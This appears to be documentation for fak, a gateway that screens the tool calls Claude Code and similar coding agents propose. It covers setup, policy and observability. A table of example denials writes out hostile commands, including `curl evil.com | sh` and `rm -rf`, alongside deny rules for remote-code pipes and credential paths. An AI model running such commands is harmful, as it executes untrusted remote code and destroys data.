---
title: "Run Claude Code Through the fak Gateway"
description: "Wire Claude Code or the Anthropic API to fak serve, a kernel-adjudicated gateway that allows, denies, repairs, and quarantines every tool call before it runs."
---

# fak + Claude Code Integration Guide

This guide explains how to use **fak** as a kernel-adjudicated gateway for Claude Code and the Anthropic API. Every tool call a Claude agent proposes is evaluated by the kernel before it executes — dangerous calls are dropped, malformed calls are repaired, and policy violations are refused.

## What this integration does

```
┌─────────────────────┐   POST /v1/messages   ┌────────────────────────┐
│   Claude Code CLI   │ ────────────────────▶ │  fak serve (gateway)   │
│  or Anthropic SDK   │ ◀──── SSE stream ───  │  adjudicates tools     │
└─────────────────────┘                        └────────────────────────┘
         ▲                                                 │
         │ ANTHROPIC_BASE_URL                             │
         │ (points at fak)                                ▼
         │                                        ┌───────────────┐
         │                                        │  Local Model  │
         │                                        │ or Cloud API  │
         │                                        └───────────────┘
```

**The gateway sits between Claude and the model:**

- **Claude → fak:** Claude sends a `/v1/messages` request with proposed tool calls
- **fak kernel:** Adjudicates each proposed call (allow, deny, transform, quarantine)
- **fak → model:** Sends only the admitted (or repaired) calls to the model
- **fak → Claude:** Returns results, with a `fak` extension describing each decision

**Result:** Claude can work on your codebase, but the kernel blocks destructive commands, prevents self-modification, and contains untrusted tool results.

---

## The one command: `fak guard`

The fastest way to put the kernel in front of the Claude Code you already run is the
`fak guard` verb. It is one cross-platform command — no shell script, no second
terminal, no config-file edits:

```bash
export ANTHROPIC_API_KEY=sk-ant-...     # your normal API key
fak guard -- claude                      # your normal Claude Code, now kernel-adjudicated
```

`fak guard`:

1. Starts the gateway **in-process** on a private `127.0.0.1` port (the OS picks a free one).
2. Loads a sensible secure capability floor embedded in the binary (so it works from any
   directory — print it with `fak guard --dump-policy`, override with `--policy FILE`).
3. Injects `ANTHROPIC_BASE_URL` into the **child process only** — your shell, your
   `settings.json`, and any other `claude` in another terminal are untouched.
4. Proxies to the **real Anthropic API in passthrough mode**: your key and the
   `cache_control` prompt-cache breakpoints flow through byte-for-byte (no cost regression),
   while every tool call Claude proposes crosses the capability floor first.
5. Tears the gateway down when Claude exits and prints what the kernel decided:

```
fak guard: 128 kernel decision(s) — 121 allowed, 5 denied, 2 repaired, 0 quarantined
  blocked: POLICY_BLOCK     x4
  blocked: SELF_MODIFY      x1
```

> **Subscription OAuth vs API key.** `fak guard` authenticates upstream with an **API
> key**, not a Claude Pro/Max subscription. Two reasons stack: Claude Code uses
> `ANTHROPIC_API_KEY` (not its OAuth token) whenever `ANTHROPIC_BASE_URL` points at a
> non-Anthropic host, and fak's upstream Anthropic client forwards the credential as the
> `x-api-key` header — the API-key scheme — whereas an OAuth token must be presented as
> `Authorization: Bearer` plus an `anthropic-beta: oauth-*` header. So export
> `ANTHROPIC_API_KEY` (guard warns when it is unset). Subscription OAuth through a proxy
> hop is a provider-side constraint, not a switch fak can flip.

Wrap a different agent or upstream by naming it after `--` and switching the provider:

```bash
fak guard --provider openai -- codex            # an OpenAI-compatible coding agent
fak guard --policy my-floor.json -- claude      # enforce your own reviewed allow-list
```

### OpenCode

[OpenCode](https://opencode.ai) speaks the OpenAI-compatible wire, so guard fronts it the
same way — over `--provider openai`:

```bash
export OPENAI_API_KEY=sk-...                       # or point --base-url at a local model
fak guard --provider openai --api-key-env OPENAI_API_KEY -- opencode
```

guard injects `OPENAI_BASE_URL=http://127.0.0.1:<port>/v1` into OpenCode (the `/v1` matters
— OpenAI-compatible clients append `/chat/completions`, so a bare host 404s). OpenCode's
built-in tools are **lowercase** (`bash`, `read`, `write`, `edit`, `grep`, `glob`,
`webfetch`, …), and the built-in floor already allows them and gates them the same as
Claude Code's: a `bash` command of `rm -rf` is denied (the destructive-command rules match
the tool name case-insensitively), and a `write`/`edit` into `.git/`, `.ssh/`, or a
credential path is refused as `SELF_MODIFY` (the floor reads OpenCode's camelCase
`filePath` argument, not only `file_path`).

If OpenCode does not pick up `OPENAI_BASE_URL` in your setup, bind a **fixed** port and
point an `opencode.json` provider at it instead — same kernel boundary, explicit wiring:

```bash
fak guard --provider openai --addr 127.0.0.1:8137 --api-key-env OPENAI_API_KEY -- opencode
```

```json
{
  "$schema": "https://opencode.ai/config.json",
  "provider": {
    "fak": {
      "npm": "@ai-sdk/openai-compatible",
      "name": "fak (kernel-adjudicated)",
      "options": { "baseURL": "http://127.0.0.1:8137/v1" },
      "models": { "your-model-id": { "name": "Your Model" } }
    }
  }
}
```

### Observability

`fak guard` mutes the gateway's request logs by default to keep your terminal clean, but
the full record is one flag or one env var away — and every count it shows is read from
the same counters `/metrics` exposes, so the views never disagree:

- **`--log FILE`** (or `--log -` for stderr) streams every per-request and per-verdict
  line — `event=gateway_http_request` and `event=gateway_operation`, each carrying the
  `trace_id` that ties the request, its verdicts, and the metrics together.
- **`FAK_AUDIT_JOURNAL=/path/audit.jsonl`** writes a durable, **hash-chained,
  tamper-evident** row for every kernel decision that survives the session — the audit
  trail of record. Each row is
  `{"seq","kind":"DECIDE","tool","trace_id","verdict","reason","by","args_digest","prev_hash","hash","witness"}`;
  an auditor re-verifies the chain to prove no row was dropped or altered.
- **Live scrape** while the session runs, on the gateway URL the banner prints (the
  loopback default is unauthenticated): `GET /metrics` (Prometheus — verdict counters,
  HTTP latency, kernel counters, vDSO hit ratio), `GET /debug/vars` (expvar JSON),
  `GET /v1/fak/events` (drain the journal tail after a `?since=` cursor).
- **On exit**, the one-line summary: allowed / denied / repaired / quarantined with a
  per-reason breakdown.

```bash
FAK_AUDIT_JOURNAL=~/fak-audit.jsonl fak guard --log ~/fak-gw.log -- claude
```

The rest of this guide covers the **local-model** dogfood path (point fak at
ollama / a shim / a large local OpenAI-compatible server) and the manual two-terminal
wiring `fak guard` automates.

---

## Quick Start (macOS/Linux)

The dogfood launcher spins up the entire stack with one command:

```bash
cd fleet/fak
./scripts/dogfood-claude.sh --probe "Reply with exactly the word: pong"
```

This:

1. Builds `fak`
2. Starts a local model (Ollama by default, or llama-server/LM Studio via preset)
3. Starts `fak serve` in front of it as an Anthropic Messages server
4. Points Claude Code at the gateway
5. Runs one headless turn and writes the witness to `experiments/agent-live/`

For interactive use:

```bash
./scripts/dogfood-claude.sh    # Opens interactive Claude Code on the local model
```

### Install for PATH access

```bash
./scripts/dogfood-claude.sh --install
# Now you can run from anywhere:
fak-dogfood --probe "hi"
fak-qwen36-claude --probe "hi"    # Qwen3.6 local preset
fak serve --help                  # Repo CLI from PATH
```

---

## Quick Start (Windows PowerShell)

Windows uses the native PowerShell script — same flow, no Ollama dependency:

```powershell
cd fleet\fak
.\scripts\dogfood-claude.ps1 --probe "say pong"
```

The Windows version:

- Uses the in-tree `local_shim.py` (transformers) instead of Ollama
- Defaults to `SmolLM2-135M` for CPU-friendly serving
- Auto-detects CUDA when available
- Auto-bumps the port if `:8080` is busy

Interactive mode:

```powershell
.\scripts\dogfood-claude.ps1
```

---

## Architecture Overview

### The three components

| Component | What it is | Who starts it |
|---|---|---|
| **Model server** | The process that generates tokens (Ollama, llama-server, LM Studio, vLLM, SGLang, or the in-tree `local_shim.py`) | You (or the dogfood script) |
| **fak serve** | The gateway that speaks Anthropic Messages API, adjudicates tool calls, and proxies to the model | `dogfood-claude.sh` or manually |
| **Claude Code** | The CLI/harness that sends agent prompts and tool calls | `dogfood-claude.sh` or manually |

### What `fak serve` exposes

| Route | Purpose |
|---|---|
| `POST /v1/messages` | Anthropic Messages API (Claude Code compatibility) |
| `POST /v1/chat/completions` | OpenAI-compatible proxy (for other clients) |
| `GET /healthz` | Health check (`{"ok":true,"model":"...","engine":"..."}`) |
| `GET /v1/models` | Advertises the served model id |
| `POST /v1/fak/syscall` | Run one adjudicated tool call (dispatch to registered engine) |
| `POST /v1/fak/adjudicate` | Get a verdict without executing |
| `POST /v1/fak/admit` | Send a tool result through the result-side floor |
| `GET /v1/fak/changes` | Cross-agent "what changed" feed (vDSO coherence) |
| `POST /v1/fak/revoke` | Revoke a poisoned witness |
| `GET /metrics` | Prometheus metrics |
| `POST /mcp` | MCP-over-HTTP |

### The kernel's adjudication

For every tool call the model proposes, the kernel evaluates:

1. **Allow-list** — is the tool named on the policy's allow-list?
2. **Argument rules** — does the argument match a deny regex? (e.g., `rm -rf`, `sudo`)
3. **Self-modify guard** — is the target path in `.git/`, `internal/kernel/`, etc.?
4. **Result quarantine** — does a tool result contain secrets or poisoned content?
5. **IFC taint** — is the trace's taint high-water mark elevated?

**Verdicts:** `ALLOW`, `DENY` (with reason), `TRANSFORM` (grammar repair), `QUARANTINE` (paged out)

---

## Manual Setup (without the dogfood script)

If you want to wire Claude Code to `fak serve` manually:

### 1. Start a model server

**Ollama (macOS/Linux):**

```bash
ollama serve &
ollama pull qwen2.5-coder:7b
```

**llama-server / LM Studio (OpenAI-compatible):**

```bash
llama-server \
  -hf lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M \
  --host 127.0.0.1 \
  --port 8131 \
  --ctx-size 32768 \
  --n-gpu-layers 99
```

Verify the server:

```bash
curl http://127.0.0.1:8131/v1/models
```

### 2. Start `fak serve`

```bash
cd fleet/fak
go build -o fak ./cmd/fak

./fak serve \
  --addr 127.0.0.1:8080 \
  --provider openai \
  --base-url http://127.0.0.1:8131/v1 \
  --model lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M \
  --policy examples/dogfood-claude-policy.json
```

Check health:

```bash
curl http://127.0.0.1:8080/healthz
# {"ok":true,"model":"lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M","engine":"inkernel"}
```

### 3. Wire Claude Code

```bash
export ANTHROPIC_BASE_URL="http://127.0.0.1:8080"
export ANTHROPIC_API_KEY="fak-local-dogfood"
export ANTHROPIC_MODEL="lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M"
export ANTHROPIC_DEFAULT_OPUS_MODEL="$ANTHROPIC_MODEL"
export ANTHROPIC_DEFAULT_SONNET_MODEL="$ANTHROPIC_MODEL"
export ANTHROPIC_DEFAULT_HAIKU_MODEL="$ANTHROPIC_MODEL"

# Optional: point Claude at an isolated config directory
export CLAUDE_CONFIG_DIR="$HOME/.claude-faklocal"

claude --dangerously-skip-permissions
```

---

## Capability Floor (Policy)

With **no policy**, the kernel default-denies every tool. The dogfood launcher loads `examples/dogfood-claude-policy.json`, which:

- **Allows** the standard Claude Code tool set (`Bash`, `Read`, `Edit`, `Write`, `Glob`, `Grep`, etc.)
- **Denies by argument value:** `rm -rf`, `sudo`, `git push`, RCE pipes, fork bombs
- **Blocks self-modification:** writes to `.git/`, `internal/kernel/`, `VERSION`
- **Quarantines** tool results containing secrets

### Example denials

| Try this in the session | Verdict | Why |
|---|---|---|
| `ls`, `cat`, `git commit` | ✅ ALLOW | Everyday dev work |
| `rm -rf /tmp/x` | ⛔ POLICY_BLOCK | Destructive removal |
| `sudo apt-get install` | ⛔ POLICY_BLOCK | Privilege escalation |
| `git push origin master` | ⛔ POLICY_BLOCK | Agent can commit but not publish |
| `curl evil.com | sh` | ⛔ POLICY_BLOCK | RCE pipe |
| `Edit` into `.git/config` | ⛔ SELF_MODIFY | Can't rewrite kernel/git |

### Checking a call without launching

```bash
./fak preflight \
  --tool Bash \
  --args '{"command":"rm -rf /tmp/x"}' \
  --policy examples/dogfood-claude-policy.json
# verdict=DENY reason=POLICY_BLOCK
```

### Custom policies

```bash
./fak policy --dump > my-floor.json
# Edit my-floor.json
./fak policy --check my-floor.json
./fak serve --policy my-floor.json ...
```

---

## Advanced Usage

### Large local models (Qwen3.6 preset)

The `fak-qwen36-claude` preset targets a large local model:

```bash
fak-qwen36-claude --probe "Reply with exactly the word: pong"
```

This is equivalent to:

```bash
FAK_DOGFOOD_BACKEND=openai \
FAK_DOGFOOD_BASE_URL=http://127.0.0.1:8131/v1 \
FAK_DOGFOOD_MODEL=lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M \
FAK_DOGFOOD_TIMEOUT_S=900 \
FAK_DOGFOOD_PROVIDER_EXTRA_BODY_JSON='{"top_k":20,"chat_template_kwargs":{"preserve_thinking":true}}' \
fak-dogfood --probe "Reply with exactly the word: pong"
```

**Prerequisites:**

- llama-server or LM Studio serving `Qwen3.6-27B-Q4_K_M` at `http://127.0.0.1:8131/v1`
- See `docs/qwen36-claude-dogfood-playbook.md` for full details

### Authentication

For production use, require an API key:

```bash
./fak serve \
  --addr 0.0.0.0:8080 \
  --base-url ... \
  --model ... \
  --require-key-env FAK_TOKEN
```

Claude Code clients send `x-api-key:` (Anthropic SDKs), which `fak` honors.

### Cloud providers

```bash
# OpenAI
./fak serve \
  --provider openai \
  --base-url https://api.openai.com/v1 \
  --api-key-env OPENAI_API_KEY \
  --model gpt-4

# Anthropic (proxy another Claude endpoint)
./fak serve \
  --provider anthropic \
  --base-url https://api.anthropic.com/v1 \
  --api-key-env ANTHROPIC_API_KEY \
  --model claude-sonnet-4-20250514
```

### Observability

**Prometheus metrics:**

```bash
curl http://127.0.0.1:8080/metrics
```

**Grafana dashboard:**

```bash
tools/grafana/up.sh
# Open http://localhost:3000 → "FAK Dogfood Slow Requests"
```

---

## Using the Anthropic API directly

The `/v1/messages` endpoint is compatible with Anthropic SDKs. Example with Python:

```python
import anthropic

client = anthropic.Anthropic(
    base_url="http://127.0.0.1:8080",   # Point at fak
    api_key="fak-local-dogfood"
)

response = client.messages.create(
    model="qwen2.5-coder:7b",
    max_tokens=1024,
    messages=[{"role": "user", "content": "List the files in this directory"}],
    tools=[{
        "type": "function",
        "function": {
            "name": "Bash",
            "description": "Run shell commands",
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {"type": "string"}
                },
                "required": ["command"]
            }
        }
    }]
)
```

### The `fak` response extension

Every response includes a `_fak` extension with adjudication details:

```json
{
  "id": "msg_...",
  "type": "message",
  "content": [...],
  "stop_reason": "tool_use",
  "_fak": {
    "version": "fak/v1",
    "admissions": [
      {
        "tool": "Bash",
        "verdict": "ALLOW",
        "by": "monitor",
        "trace_id": "..."
      }
    ]
  }
}
```

---

## Environment Reference

| Variable | Purpose | Default |
|---|---|---|
| `ANTHROPIC_BASE_URL` | Points Claude Code at fak | `http://127.0.0.1:8080` |
| `ANTHROPIC_API_KEY` | Auth (loopback ignores this) | `fak-local-dogfood` |
| `CLAUDE_CONFIG_DIR` | Isolated account directory | `$HOME/.claude` |
| `ANTHROPIC_MODEL` | Model id for all tiers | Set by dogfood script |
| `API_TIMEOUT_MS` | Claude Code timeout | Raised by dogfood script |
| `FAK_DOGFOOD_PORT` | fak listen port | `8080` |
| `FAK_DOGFOOD_MODEL` | Model id | Auto-selected |
| `FAK_DOGFOOD_BACKEND` | `ollama`, `shim`, `openai` | `ollama` (macOS/Linux), `shim` (Windows) |
| `FAK_DOGFOOD_BASE_URL` | OpenAI upstream | Required for `backend=openai` |
| `FAK_DOGFOOD_TIMEOUT_S` | Planner/write timeout | `300` (ollama/shim), `900` (openai) |
| `FAK_DOGFOOD_POLICY` | Policy manifest | `examples/dogfood-claude-policy.json` |
| `FAK_DOGFOOD_ACCOUNT` | Account tag for switcher | `faklocal` |

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| `fak: command not found` | Run `./scripts/dogfood-claude.sh --install` |
| Port `8080` already in use | Set `FAK_DOGFOOD_PORT=8090` |
| First request very slow (>60s) | Expected on large local models — the prompt is ~25K tokens |
| Claude exits at 60s | Set `FAK_DOGFOOD_TIMEOUT_S=900` |
| `/v1/models` fails | Fix the upstream model server first |
| `ollama not found` | Install Ollama, or use `FAK_DOGFOOD_BACKEND=shim` |
| Model says "pong" is wrong | Tiny models give weak answers — use a 7B+ model |
| `verify` errors | Check `FAK_MODEL_DIR` for in-kernel models |

### Debug logs

```bash
# Claude debug → /tmp/fak-claude.log
export FAK_DOGFOOD_CLAUDE_DEBUG=api

# Gateway log → /tmp/fak-serve.log
tail -f /tmp/fak-serve.log
```

---

## Cross-references

- `fak/DOGFOOD-CLAUDE.md` — Full dogfood launcher documentation
- `fak/GETTING-STARTED.md` — fak install and run guide
- `docs/qwen36-claude-dogfood-playbook.md` — Qwen3.6 local model specifics
- `fak/POLICY.md` — Policy manifest schema
- `fak/ARCHITECTURE.md` — fak internal architecture
